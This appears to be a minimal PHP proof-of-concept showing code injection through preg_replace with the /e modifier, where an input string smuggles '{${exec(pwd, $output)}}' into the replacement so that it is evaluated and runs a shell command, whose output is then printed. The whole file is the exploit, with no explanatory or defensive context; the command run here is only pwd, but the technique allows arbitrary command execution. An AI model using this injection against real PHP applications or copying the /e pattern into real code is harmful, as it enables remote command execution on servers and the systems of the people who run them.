<?php
	$output = null;
	$input = 'abc;{${exec(pwd, $output)}}';
	preg_replace("/(.*);(.*)/e", "\"\\2\"", $input);
	print_r($output);
?>
